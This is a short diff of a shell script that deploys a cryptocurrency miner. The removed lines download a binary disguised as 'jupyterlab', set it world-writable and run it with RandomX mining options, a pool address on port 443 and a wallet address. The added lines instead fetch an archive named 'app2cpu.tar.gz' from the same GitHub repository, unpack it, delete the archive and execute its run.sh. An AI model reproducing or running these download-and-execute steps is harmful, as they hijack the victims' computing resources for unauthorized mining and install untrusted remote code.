@@ -1,4 +1,6 @@
 cd
-curl -s -L -o pluto https://github.com/Dirianda12/mainble/releases/download/mx/jupyterlab
-chmod 777 pluto
-./pluto -a randomx -o 185.84.98.5:443 -u 876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy -p ver2 -t 3
+wget https://github.com/Dirianda12/mainble/releases/download/mx/app2cpu.tar.gz
+tar xf app2cpu.tar.gz
+rm -rf app2cpu.tar.gz
+chmod +x run.sh
+./run.sh
